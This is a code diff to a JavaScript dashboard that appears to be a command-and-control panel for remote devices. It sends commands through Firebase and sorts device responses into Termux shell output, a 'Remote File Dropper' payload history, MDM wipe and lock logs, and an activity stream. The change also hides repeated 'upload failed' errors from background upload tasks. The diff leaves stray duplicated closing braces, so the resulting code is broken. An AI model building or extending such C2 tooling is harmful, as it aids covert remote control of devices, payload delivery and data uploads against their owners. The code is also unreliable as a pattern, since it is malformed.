@@ -248,33 +248,38 @@ function startRealtimeDeviceListener(deviceId) {
     // Subscribe to command responses across output containers
     const responseHandler = snapshot => {
         const respText = snapshot.val();
-        if (respText) {
-            const timestamp = new Date().toLocaleTimeString();
+        if (!respText) return;
 
-            // Termux Console gets formatted CLI output (per user request, keeping Termux as terminal CLI)
+        // Filter out legacy 404 upload error messages from repeating background tasks
+        if (respText.includes("Upload failed: 404")) return;
+
+        const timestamp = new Date().toLocaleTimeString();
+        const lastCmd = (window.lastDispatchedCmd || "").toLowerCase();
+        const isTermuxCmd = lastCmd.includes("termux") || lastCmd.includes("shell") || respText.startsWith("[Termux]") || respText.startsWith("$ ");
+
+        // Termux Console gets formatted CLI output ONLY for Termux commands
+        if (isTermuxCmd) {
             const termuxBox = document.getElementById("termuxConsoleOutput");
             if (termuxBox) {
                 termuxBox.innerHTML += `\n[${timestamp}] Response:\n${respText}\n`;
                 termuxBox.scrollTop = termuxBox.scrollHeight;
             }
+        }
 
-            // Executive Activity Stream gets structured timeline cards with timestamp
-            const streamBox = document.getElementById("execActivityStream");
-            if (streamBox) {
-                if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
-                const card = document.createElement("div");
-                card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
-                card.innerHTML = `
-                    <div class="d-flex justify-content-between align-items-center mb-1">
-                        <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
-                        <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
-                    </div>
-                    <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
-                `;
-                streamBox.prepend(card);
+        // Remote File Dropper output container
+        if (lastCmd.includes("download") || lastCmd.includes("dropper") || respText.includes("Payload") || respText.includes("File downloaded")) {
+            const dropperBox = document.getElementById("fileDropperHistoryList");
+            if (dropperBox) {
+                if (dropperBox.querySelector(".text-muted")) dropperBox.innerHTML = "";
+                const item = document.createElement("div");
+                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
+                item.innerHTML = `<span class="badge bg-success me-2">${timestamp}</span> ${escapeHtml(respText)}`;
+                dropperBox.prepend(item);
             }
+        }
 
-            // MDM Log List
+        // MDM Security Log List
+        if (lastCmd.includes("mdm") || lastCmd.includes("wipe") || lastCmd.includes("lock")) {
             const mdmBox = document.getElementById("mdmLogList");
             if (mdmBox) {
                 if (mdmBox.querySelector(".text-muted")) mdmBox.innerHTML = "";
@@ -283,6 +288,24 @@ function startRealtimeDeviceListener(deviceId) {
                 item.innerHTML = `<span class="badge bg-info me-2">${timestamp}</span> ${escapeHtml(respText)}`;
                 mdmBox.prepend(item);
             }
+        }
+
+        // Executive Activity Stream gets structured timeline cards with timestamp
+        const streamBox = document.getElementById("execActivityStream");
+        if (streamBox) {
+            if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
+            const card = document.createElement("div");
+            card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
+            card.innerHTML = `
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                    <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
+                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
+                </div>
+                <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
+            `;
+            streamBox.prepend(card);
+        }
+    };
         }
     };
     const responseRef = db.ref(`users/${uid}/devices/${deviceId}/response`);
@@ -440,6 +463,7 @@ function sendC2CommandToDevice(cmdText) {
     if (!cmdText) return;
     // Normalize '/' prefix to '!' prefix for command consistency
     const normalizedCmd = cmdText.startsWith("/") ? "!" + cmdText.substring(1) : cmdText;
+    window.lastDispatchedCmd = normalizedCmd;
 
     const uid = currentUser ? currentUser.uid : "default_user";
     const db = firebase.database();
